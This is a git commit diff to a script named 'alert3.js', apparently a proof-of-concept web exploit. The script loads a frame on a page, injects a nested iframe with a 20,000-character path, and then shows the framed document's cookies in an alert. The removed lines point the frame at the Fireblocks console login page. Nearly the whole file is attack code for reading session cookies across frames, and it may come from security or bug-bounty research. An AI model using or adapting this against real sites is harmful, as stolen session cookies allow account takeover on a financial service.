154c9eb2eec64409048b4ce1b9bfda3dcaefbf47
vasilevigor3 <32871596+vasilevigor3@users.noreply.github.com>
2023-08-13 19:47:33 +0400

    Update alert3.js

--- alert3.js
+++ alert3.js
@@ -1,10 +1,12 @@
 const iframe = document.querySelector('.asd');
 
-iframe.src="/"+"A".repeat(20000);
-iframe.src="https://console.fireblocks.io/welcome/login";
 iframe.addEventListener('load', () => {
   
-  const childDocument = iframe.contentDocument || iframe.contentWindow.document;  
+  const childDocument = iframe.contentWindow.document;
+  const nestedIframe = document.createElement('iframe');
+  nestedIframe.src = "/"+"A".repeat(20000);
+  childDocument.body.appendChild(nestedIframe);
+  
   const iframeWindow = iframe.contentWindow;
   iframeWindow.alert(iframe.contentWindow.document.cookie);		
 });
